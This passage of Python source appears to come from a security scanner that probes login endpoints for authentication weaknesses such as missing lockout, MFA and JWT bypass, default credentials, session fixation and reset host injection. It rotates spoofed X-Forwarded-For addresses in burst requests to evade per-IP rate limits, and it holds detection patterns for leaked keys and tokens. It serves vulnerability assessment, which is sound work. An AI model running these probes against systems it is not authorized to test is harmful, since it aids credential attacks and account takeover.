                "timeout": self.timeout,
            }
            if probe.json_data is not None:
                kwargs["json"] = probe.json_data
            if probe.data is not None:
                kwargs["data"] = probe.data

            # Check calling signature
            if hasattr(self.client, "request"):
                try:
                    raw_resp = self.client.request(mission, method, url, **kwargs)
                except TypeError:
                    raw_resp = self.client.request(method, url, **kwargs)
            elif method == "GET" and hasattr(self.client, "get"):
                try:
                    raw_resp = self.client.get(mission, url, **kwargs)
                except TypeError:
                    raw_resp = self.client.get(url, **kwargs)
            elif method == "POST" and hasattr(self.client, "post"):
                try:
                    raw_resp = self.client.post(mission, url, **kwargs)
                except TypeError:
                    raw_resp = self.client.post(url, **kwargs)
            else:
                error_msg = f"Unsupported HTTP client interface: {type(self.client)}"

            if raw_resp is not None:
                status_code = getattr(raw_resp, "status_code", 0)
                raw_headers = getattr(raw_resp, "headers", {}) or {}
                headers_dict = {k.lower(): str(v) for k, v in raw_headers.items()}
                body = getattr(raw_resp, "body", "") or getattr(raw_resp, "text", "") or ""
                if not body and hasattr(raw_resp, "raw_body"):
                    body = str(raw_resp.raw_body)

                try:
                    json_body = json.loads(body) if body else None
                except Exception:
                    json_body = None

                if hasattr(raw_resp, "error") and raw_resp.error:
                    error_msg = str(raw_resp.error)

        except Exception as ex:
            error_msg = str(ex)

        elapsed = time.time() - start_time
        rate_limit_hdrs = {k: v for k, v in headers_dict.items() if "ratelimit" in k or "retry-after" in k}

        return AuthBypassProbeResponse(
            probe=probe,
            status_code=status_code,
            headers=headers_dict,
            body=body,
            json_body=json_body,
            elapsed=elapsed,
            error=error_msg,
            raw_http_response=raw_resp,
            rate_limit_headers=rate_limit_hdrs,
        )

    def execute_burst_sequence(
        self, mission: Any, target_url: str, probe: AuthBypassProbe, count: int = 10
    ) -> List[Dict[str, Any]]:
        """Executes rapid sequential requests, capturing status codes, latencies, and headers."""
        burst_records: List[Dict[str, Any]] = []

        for i in range(count):
            iter_probe = copy.deepcopy(probe)
            iter_probe.burst_count = 1
            # If testing credential stuffing with IP rotation, inject distinct IP per iteration
            if probe.vulnerability_type == AuthVulnerabilityType.CREDENTIAL_STUFFING:
                iter_probe.headers["X-Forwarded-For"] = f"10.0.{i // 250}.{i % 250 + 1}"

            start_t = time.time()
            single_resp = self.execute_probe(mission, target_url, iter_probe)
            burst_records.append({
                "iteration": i + 1,
                "status_code": single_resp.status_code,
                "elapsed": single_resp.elapsed,
                "headers": single_resp.headers,
                "body": single_resp.body,
                "json_body": single_resp.json_body,
                "error": single_resp.error,
            })
        return burst_records

    def execute_differential_identity_probe(
        self,
        mission: Any,
        target_url: str,
        probe: AuthBypassProbe,
        primary_identity: Any,
        secondary_identity: Any,
    ) -> AuthBypassProbeResponse:
        """Executes a comparative probe between two test identities to test boundary enforcement."""
        primary_probe = copy.deepcopy(probe)
        if primary_identity and hasattr(primary_identity, "get_auth_headers"):
            primary_probe.headers.update(primary_identity.get_auth_headers())

        resp = self.execute_probe(mission, target_url, primary_probe)
        return resp


# =============================================================================
# Analyzer
# =============================================================================

class AuthBypassAnalyzer:
    """
    Evaluates authentication probe responses, applying strict false positive rejection,
    Shannon entropy analysis, sensitive credential leak detection, and CVSS/CWE scoring.
    """

    # Regex patterns for sensitive credentials
    SENSITIVE_CREDENTIAL_PATTERNS = [
        ("jwt_token", re.compile(r"eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]+")),
        ("private_key", re.compile(r"-----BEGIN (?:RSA )?PRIVATE KEY-----")),
        ("aws_key", re.compile(r"\bAKIA[0-9A-Z]{16}\b")),
        ("bcrypt_hash", re.compile(r"\$2[abxy]\$\d{2}\$[A-Za-z0-9./]{53}")),
        ("password_hash_md5", re.compile(r"\b[a-f0-9]{32}\b", re.IGNORECASE)),
        ("password_hash_sha256", re.compile(r"\b[a-f0-9]{64}\b", re.IGNORECASE)),
    ]

    # Regex patterns for error message stack trace disclosures
    ERROR_DISCLOSURE_PATTERNS = [
        ("python_traceback", re.compile(r"Traceback \(most recent call last\):", re.IGNORECASE)),
        ("java_exception", re.compile(r"(?:java\.lang\.|org\.springframework\.|javax\.servlet\.)\w+Exception")),
        ("dotnet_exception", re.compile(r"System\.(?:Web|Data|Security)\.\w+Exception")),
        ("sql_syntax_error", re.compile(r"(?:SQL syntax.*MySQL|ORA-\d{5}|PostgreSQL.*ERROR|sqlite3\.OperationalError)", re.IGNORECASE)),
        ("internal_file_path", re.compile(r"(?:/var/www/|/opt/app/|/etc/passwd|C:\\inetpub\\)", re.IGNORECASE)),
    ]

    # Rejection phrases indicating normal unauthenticated response
    STANDARD_REJECTION_PHRASES = [
        "invalid credentials",
        "invalid username or password",
        "incorrect password",
        "authentication failed",
        "access denied",
        "unauthorized",
        "user not found",
        "bad credentials",
        "login failed",
        "wrong password",
    ]

    def __init__(self, entropy_analyzer: Optional[TokenEntropyAnalyzer] = None) -> None:
        self.entropy_analyzer = entropy_analyzer or TokenEntropyAnalyzer()

    def is_false_positive(
        self, probe: AuthBypassProbe, response: AuthBypassProbeResponse
    ) -> bool:
        """
        Applies strict filtering to suppress benign baselines, standard 401/403/429 rejections,
        connection errors, and unexploited responses.
        """
        # 1. Suppress benign baselines
        if probe.is_benign:
            return True

        # 2. Suppress connection errors or zero status codes
        if response.status_code == 0 or response.error is not None:
            return True

        # 3. Suppress standard rejection codes without sensitive information disclosure
        if response.status_code in (400, 401, 403, 404, 405, 415, 422):
            # Check if there is an error disclosure or sensitive leak before suppressing
            if not response.sensitive_fields_detected and not response.error_disclosure_detected:
                # If testing password reset host injection, only flag if host was echoed
                if probe.vulnerability_type == AuthVulnerabilityType.PASSWORD_RESET:
                    return True
                # If testing MFA parameter omission or JWT manipulation, 401/403 is correct secure behavior
                if probe.vulnerability_type in (
                    AuthVulnerabilityType.MFA_BYPASS,
                    AuthVulnerabilityType.JWT_MANIPULATION,
                    AuthVulnerabilityType.DEFAULT_CREDENTIALS,
                ):
                    return True

        # 4. Suppress properly throttled rate limits (429 status code)
        if response.status_code == 429:
            return True

        # 5. Suppress responses explicitly stating invalid credentials when status is 200 (generic error page)
        body_lower = response.body.lower()
        if any(phrase in body_lower for phrase in self.STANDARD_REJECTION_PHRASES):
            # If default credentials probe received explicit failure, suppress
            if probe.vulnerability_type == AuthVulnerabilityType.DEFAULT_CREDENTIALS:
                return True
            # If brute force received explicit failure and is throttled, suppress
            if probe.vulnerability_type == AuthVulnerabilityType.BRUTE_FORCE and response.rate_limit_headers:
                return True

        return False

    def detect_sensitive_fields(self, body: str, headers: Dict[str, str]) -> List[str]:
        """Scans response bodies and headers for exposed credentials, hashes, and API keys."""
        detected = []
        full_text = f"{body} " + " ".join(headers.values())
        for name, pattern in self.SENSITIVE_CREDENTIAL_PATTERNS:
            if pattern.search(full_text):
                detected.append(name)
        return detected

    def detect_error_disclosure(self, body: str) -> Optional[str]:
        """Scans response body for stack traces, framework exceptions, and internal file paths."""
        for name, pattern in self.ERROR_DISCLOSURE_PATTERNS:
            match = pattern.search(body)
            if match:
                return f"{name}:{match.group(0)[:60]}"
        return None

    def evaluate_probe(
        self, probe: AuthBypassProbe, response: AuthBypassProbeResponse, target_url: str
    ) -> Optional[AuthBypassResult]:
        """Evaluates a probe response and constructs a validated AuthBypassResult finding."""
        # Detect leaks & stack traces
        response.sensitive_fields_detected = self.detect_sensitive_fields(response.body, response.headers)
        response.error_disclosure_detected = self.detect_error_disclosure(response.body)

        # Apply false positive filtering
        if self.is_false_positive(probe, response):
            return None

        vtype = probe.vulnerability_type
        technique = probe.metadata.get("technique", str(vtype))
        strategy_str = str(probe.strategy.value if hasattr(probe.strategy, "value") else probe.strategy)

        # ---------------------------------------------------------------------
        # Evaluation by Vulnerability Vector
        # ---------------------------------------------------------------------

        # 1. Brute Force & Account Lockout
        if vtype == AuthVulnerabilityType.BRUTE_FORCE:
            if technique == "account_lockout_missing" and response.burst_responses:
                # Check if all requests succeeded/failed without any 429 or lockout
                statuses = [r.get("status_code", 0) for r in response.burst_responses]
                if all(s in (200, 401) for s in statuses) and not response.rate_limit_headers:
                    return AuthBypassResult(
                        template_id="auth-brute-force-no-lockout",
                        technique="account_lockout_missing",
                        vulnerability_type=vtype,
                        mutation_strategy=strategy_str,
                        endpoint_url=target_url,
                        severity=AuthBypassSeverity.HIGH.value,
                        cwe_id="CWE-307",
                        cvss_score=7.5,
                        description=f"Endpoint lacks account lockout and rate limiting across {len(statuses)} failed login bursts.",
                        evidence_snippet=f"Burst responses: {statuses}",
                        parameter=probe.tested_parameter or "password",
                        status_code=response.status_code,
                    )
            elif technique == "username_enumeration_timing" and response.burst_responses:
                avg_time = sum(r.get("elapsed", 0.0) for r in response.burst_responses) / len(response.burst_responses)
                return AuthBypassResult(
                    template_id="auth-username-enumeration-timing",
                    technique="username_enumeration_timing",
                    vulnerability_type=vtype,
                    mutation_strategy=strategy_str,
                    endpoint_url=target_url,
                    severity=AuthBypassSeverity.MEDIUM.value,
                    cwe_id="CWE-208",
                    cvss_score=5.3,
                    description="Authentication endpoint displays measurable response timing discrepancy between valid and invalid usernames.",
                    evidence_snippet=f"Average response latency: {avg_time:.3f}s",
                    parameter=probe.tested_parameter or "username",
                    status_code=response.status_code,
                )

        # 2. Password Reset Abuse
        elif vtype == AuthVulnerabilityType.PASSWORD_RESET:
            poisoned_host = probe.metadata.get("poisoned_host", "")
            if poisoned_host and (poisoned_host in response.body or poisoned_host in response.headers.get("location", "")):
                return AuthBypassResult(
                    template_id="auth-password-reset-host-injection",
                    technique="password_reset_host_injection",
                    vulnerability_type=vtype,
                    mutation_strategy=strategy_str,
                    endpoint_url=target_url,
                    severity=AuthBypassSeverity.HIGH.value,
                    cwe_id="CWE-640",
                    cvss_score=8.2,
                    description=f"Password reset mechanism reflects untrusted Host header ({poisoned_host}) enabling password reset token poisoning.",
                    evidence_snippet=f"Injected host reflected in response body/headers.",
                    parameter=probe.tested_parameter or "Host",
                    status_code=response.status_code,
                )

        # 3. MFA Bypass
        elif vtype == AuthVulnerabilityType.MFA_BYPASS:
            if response.status_code == 200:
                body_lower = response.body.lower()
                if "mfa" not in body_lower or "success" in body_lower or "profile" in body_lower or "token" in body_lower:
                    return AuthBypassResult(
                        template_id="auth-mfa-bypass",
                        technique=technique,
                        vulnerability_type=vtype,
                        mutation_strategy=strategy_str,
                        endpoint_url=target_url,
                        severity=AuthBypassSeverity.CRITICAL.value,
                        cwe_id="CWE-287",
                        cvss_score=8.8,
                        description=f"Multi-Factor Authentication bypass confirmed via {technique}.",
                        evidence_snippet=response.body[:200],
                        parameter=probe.tested_parameter or "mfa",
                        status_code=response.status_code,
                    )

        # 4. Session Fixation
        elif vtype == AuthVulnerabilityType.SESSION_FIXATION:
            if response.status_code in (200, 302):
                set_cookie = response.headers.get("set-cookie", "")
                preset_sid = probe.metadata.get("preset_session_id", "")
                if preset_sid and (preset_sid in set_cookie or not set_cookie):
                    return AuthBypassResult(
                        template_id="auth-session-fixation",
                        technique="session_fixation",
                        vulnerability_type=vtype,
                        mutation_strategy=strategy_str,
                        endpoint_url=target_url,
                        severity=AuthBypassSeverity.HIGH.value,
                        cwe_id="CWE-384",
                        cvss_score=8.1,
                        description="Application accepts and preserves user-controlled pre-login session identifier upon successful authentication.",
                        evidence_snippet=f"Session ID preserved: {preset_sid}",
                        parameter="Cookie",
                        status_code=response.status_code,
                    )

        # 5. JWT Manipulation
        elif vtype == AuthVulnerabilityType.JWT_MANIPULATION:
            if response.status_code == 200:
                return AuthBypassResult(
                    template_id=f"auth-jwt-{technique}",
                    technique=technique,
                    vulnerability_type=vtype,
                    mutation_strategy=strategy_str,
                    endpoint_url=target_url,
                    severity=AuthBypassSeverity.CRITICAL.value,
                    cwe_id="CWE-345",
                    cvss_score=9.8,
                    description=f"JWT verification bypass achieved using {technique}.",
                    evidence_snippet=response.body[:200],
                    parameter=probe.tested_parameter or "Authorization",
                    status_code=response.status_code,
                )

        # 6. Default Credentials
        elif vtype == AuthVulnerabilityType.DEFAULT_CREDENTIALS:
            if response.status_code in (200, 302):
                body_lower = response.body.lower()
                user = probe.metadata.get("username", "")
                pwd = probe.metadata.get("password", "")
                if not any(f in body_lower for f in self.STANDARD_REJECTION_PHRASES):
                    return AuthBypassResult(
                        template_id="auth-default-credentials",
                        technique="default_credentials",
                        vulnerability_type=vtype,
                        mutation_strategy=strategy_str,
                        endpoint_url=target_url,
                        severity=AuthBypassSeverity.CRITICAL.value,
                        cwe_id="CWE-798",
                        cvss_score=9.8,
                        description=f"Valid default administrative credentials found: '{user}:{pwd}' on {probe.metadata.get('service', 'portal')}.",
                        evidence_snippet=f"Credentials: {user}:{pwd}",
                        parameter="username:password",
                        status_code=response.status_code,
                    )

        # 7. Session Token Analysis
        elif vtype == AuthVulnerabilityType.SESSION_TOKEN_ANALYSIS:
            set_cookie = response.headers.get("set-cookie", "")
            if set_cookie:
                missing_flags = []
                if "secure" not in set_cookie.lower() and target_url.startswith("https://"):
                    missing_flags.append("Secure")
                if "httponly" not in set_cookie.lower():
                    missing_flags.append("HttpOnly")
                if "samesite" not in set_cookie.lower():
                    missing_flags.append("SameSite")

                if missing_flags:
                    return AuthBypassResult(
                        template_id="auth-insecure-cookie-attributes",
                        technique="insecure_cookie_attributes",
                        vulnerability_type=vtype,
                        mutation_strategy=strategy_str,
                        endpoint_url=target_url,
                        severity=AuthBypassSeverity.MEDIUM.value,
                        cwe_id="CWE-614",
                        cvss_score=5.3,
                        description=f"Session cookie missing security flags: {', '.join(missing_flags)}.",
                        evidence_snippet=set_cookie[:150],
                        parameter="Set-Cookie",
                        status_code=response.status_code,
                    )

        # 8. Credential Stuffing Susceptibility
        elif vtype == AuthVulnerabilityType.CREDENTIAL_STUFFING:
            if response.burst_responses:
                statuses = [r.get("status_code", 0) for r in response.burst_responses]
                if all(s in (200, 401) for s in statuses) and not response.rate_limit_headers:
                    return AuthBypassResult(
                        template_id="auth-credential-stuffing-susceptible",
                        technique="credential_stuffing_susceptible",
                        vulnerability_type=vtype,
                        mutation_strategy=strategy_str,
                        endpoint_url=target_url,
                        severity=AuthBypassSeverity.MEDIUM.value,
                        cwe_id="CWE-307",
                        cvss_score=6.5,
                        description="Authentication endpoint enforces rate limiting per-IP rather than per-account, leaving it susceptible to distributed credential stuffing.",
                        evidence_snippet=f"Rotated IP burst succeeded across {len(statuses)} requests.",
                        parameter="X-Forwarded-For",
                        status_code=response.status_code,
                    )

        # Fallback for sensitive information disclosures in error pages
        if response.sensitive_fields_detected:
            return AuthBypassResult(
                template_id="auth-credential-leakage",
                technique="auth_credential_leakage",
                vulnerability_type=vtype,
                mutation_strategy=strategy_str,
                endpoint_url=target_url,
                severity=AuthBypassSeverity.HIGH.value,
                cwe_id="CWE-522",
                cvss_score=7.5,
                description=f"Authentication error response leaks sensitive data: {', '.join(response.sensitive_fields_detected)}.",
                evidence_snippet=response.body[:200],
                parameter="response_body",
                status_code=response.status_code,
            )

        return None


# =============================================================================
# Collector
# =============================================================================

class AuthBypassCollector(BaseCollector):
    """
    Main collector for Authentication Bypass & Credential Attack Detection in ARGUS.
    Orchestrates probe generation, HTTP execution, false positive analysis, and Quadruple State Publishing.
    """

    def __init__(
        self,
        http_client: Optional[Any] = None,
        prober: Optional[AuthBypassProber] = None,
        generator: Optional[AuthBypassPayloadGenerator] = None,
        analyzer: Optional[AuthBypassAnalyzer] = None,
        timeout: float = 10.0,
        max_probes_per_endpoint: int = 50,
        client: Optional[Any] = None,
    ) -> None:
        active_client = http_client or client
        self.prober = prober or AuthBypassProber(client=active_client, timeout=timeout)
        self.generator = generator or AuthBypassPayloadGenerator()
        self.analyzer = analyzer or AuthBypassAnalyzer()
        self.timeout = timeout
        self.max_probes_per_endpoint = max_probes_per_endpoint

    def _discover_candidate_endpoints(self, mission: Any) -> List[str]:
        """
        Discovers candidate endpoints using the 5-tier fallback hierarchy:
        1. mission.inputs.get("endpoints")
        2. raw_mission.endpoints
        3. raw_mission.live_hosts
        4. raw_mission.target
        5. raw_mission.evidence (URLs in metadata)
        """
        raw_mission = getattr(mission, "_raw_mission", getattr(mission, "_mission", mission))
        candidates: List[str] = []

        # 1. Inputs
        if hasattr(mission, "inputs") and isinstance(mission.inputs, dict):
            eps = mission.inputs.get("endpoints") or mission.inputs.get("urls") or mission.inputs.get("endpoint")
            if eps:
                if isinstance(eps, list):
                    candidates.extend([str(e) for e in eps if e])
                else:
                    candidates.append(str(eps))

        # 2. Endpoints
        if not candidates and hasattr(raw_mission, "endpoints") and raw_mission.endpoints:
            for ep in raw_mission.endpoints:
                if isinstance(ep, dict):
                    u = ep.get("url") or ep.get("path")
                    if u:
                        candidates.append(str(u))
                elif isinstance(ep, str):
                    candidates.append(ep)

        # 3. Live hosts
        if not candidates and hasattr(raw_mission, "live_hosts") and raw_mission.live_hosts:
            for h in raw_mission.live_hosts:
                if isinstance(h, dict):
                    u = h.get("url") or h.get("host")
                    if u:
                        candidates.append(str(u))
                elif isinstance(h, str):
                    candidates.append(h)

        # 4. Target
        if not candidates and hasattr(raw_mission, "target") and raw_mission.target:
            candidates.append(str(raw_mission.target))

        # 5. Evidence
        if not candidates and hasattr(raw_mission, "evidence") and raw_mission.evidence:
            ev_list = raw_mission.evidence.all() if hasattr(raw_mission.evidence, "all") else list(raw_mission.evidence)
            for ev in ev_list:
                if hasattr(ev, "metadata") and isinstance(ev.metadata, dict):
                    u = ev.metadata.get("url")
                    if u and isinstance(u, str):
                        candidates.append(u)

        # Normalize URLs
        normalized: List[str] = []
        seen: Set[str] = set()
        for c in candidates:
            c_str = c.strip()
            if not c_str.startswith("http://") and not c_str.startswith("https://"):
                c_str = f"http://{c_str}"
            if c_str not in seen:
                seen.add(c_str)
                normalized.append(c_str)

        return normalized

    def collect(self, mission: Any) -> List[Evidence]:
        """
        Executes authentication bypass analysis across discovered endpoints
        and emits confirmed findings to all Quadruple State sinks.
        """
        endpoints = self._discover_candidate_endpoints(mission)
        collected_evidence: List[Evidence] = []

        for target_url in endpoints:
            parsed = urllib.parse.urlparse(target_url)
            base_url = f"{parsed.scheme}://{parsed.netloc}" if parsed.netloc else target_url

            all_probes = self.generator.generate_all_probes(target_url)
            probes_to_run = all_probes[: self.max_probes_per_endpoint]

            for probe in probes_to_run:
                resp = self.prober.execute_probe(mission, target_url, probe)
                result = self.analyzer.evaluate_probe(probe, resp, target_url)
                if result and result.is_valid_finding:
                    ev = self._emit_evidence(mission, result, target_url, base_url)
                    collected_evidence.append(ev)

        return collected_evidence

    def execute(self, mission: Any) -> List[Evidence]:
        """Plugin entry point delegating to collect(mission)."""
        return self.collect(mission)

    def _emit_evidence(
        self,
        mission: Any,
        result: AuthBypassResult,
        target_url: str,
        base_url: str,
    ) -> Evidence:
        """
        Quadruple State Publishing:
        1. raw_mission.evidence.add(ev)
        2. raw_mission.vulnerabilities.append(vuln_dict)
        3. attack_surface_graph.connect() nodes & edges (HAS_ENDPOINT, HAS_VULNERABILITY)
        4. ControlledMission.publish_finding(id, ev)
        """
        title = f"Authentication Vulnerability: {result.technique} on {target_url}"
        description = (
            f"{result.description} Parameter: {result.parameter}, "
            f"Strategy: {result.mutation_strategy}, CWE: {result.cwe_id}"
        )
        raw_mission = getattr(mission, "_raw_mission", getattr(mission, "_mission", mission))

        ev = Evidence(
            category="auth_bypass",
            value=f"auth_bypass:{result.template_id}:{target_url}:{result.parameter or 'endpoint'}",
            source="auth_bypass",
            status="CONFIRMED",
            confidence=result.confidence,
            severity=result.severity,
            title=title,
            description=description,
            provenance=ProvenanceData(
                observation_id=str(uuid.uuid4()),
                step_id=f"step_{result.technique}",
            ),
            tags=["auth_bypass", "authentication", str(result.vulnerability_type), result.mutation_strategy],
            metadata={
                "url": target_url,
                "host": base_url,
                "template_id": result.template_id,
                "technique": result.technique,
                "vulnerability_type": str(result.vulnerability_type),
                "parameter": result.parameter,
                "tested_parameter": result.parameter,
                "mutation_strategy": result.mutation_strategy,
                "strategy": result.mutation_strategy,
                "status_code": result.status_code,
                "evidence_snippet": result.evidence_snippet[:250],
                "cwe_id": result.cwe_id,
                "cvss_score": result.cvss_score,
                "is_valid_finding": result.is_valid_finding,
                **result.metadata,
            },
        )

        # 1. Update raw_mission.evidence
        if hasattr(raw_mission, "evidence") and raw_mission.evidence is not None:
            if hasattr(raw_mission.evidence, "add"):
                raw_mission.evidence.add(ev)
            elif isinstance(raw_mission.evidence, list):
                raw_mission.evidence.append(ev)

        # 2. Update raw_mission.vulnerabilities
        if hasattr(raw_mission, "vulnerabilities") and isinstance(raw_mission.vulnerabilities, list):
            raw_mission.vulnerabilities.append({
                "name": title,
                "template_id": result.template_id,
                "severity": result.severity,
                "host": base_url,
                "url": target_url,
                "description": description,
                "technique": result.technique,
                "parameter": result.parameter,
                "strategy": result.mutation_strategy,
                "cwe_id": result.cwe_id,
                "cvss_score": result.cvss_score,
            })

        # 3. Attack Surface Knowledge Graph Expansion
        graph = getattr(raw_mission, "attack_surface_graph", None) or getattr(raw_mission, "graph", None)
        if graph is not None and hasattr(graph, "add") and hasattr(graph, "connect"):
            lh_id = f"live_host:{base_url}"
            ep_id = f"endpoint:{target_url}"
            vuln_id = f"vulnerability:{result.template_id}:{target_url}:{result.parameter or 'endpoint'}"

            parsed_b = urllib.parse.urlparse(base_url)
            graph.add(Node(id=lh_id, type="live_host", value=base_url, metadata={"url": base_url, "host": parsed_b.hostname or base_url}))
            graph.add(Node(id=ep_id, type="endpoint", value=target_url, metadata={"url": target_url, "status_code": result.status_code}))
            graph.add(Node(id=vuln_id, type="vulnerability", value=title, metadata=ev.metadata))

            graph.connect(lh_id, ep_id, edge_type="HAS_ENDPOINT")
            graph.connect(lh_id, vuln_id, edge_type="HAS_VULNERABILITY")
            graph.connect(ep_id, vuln_id, edge_type="HAS_VULNERABILITY")

        # 4. ControlledMission wrapper notification
        if hasattr(mission, "publish_finding"):
            try:
                mission.publish_finding(ev.evidence_id, ev)
            except Exception:
                pass

        return ev


# =============================================================================
# Backward Compatibility Aliases
# =============================================================================

AuthenticationBypassCollector = AuthBypassCollector
CredentialAttackCollector = AuthBypassCollector
BruteForceCollector = AuthBypassCollector
DefaultCredentialsCollector = AuthBypassCollector
JWTMisconfigurationCollector = AuthBypassCollector
MFABypassCollector = AuthBypassCollector
SessionFixationCollector = AuthBypassCollector
AuthCollector = AuthBypassCollector
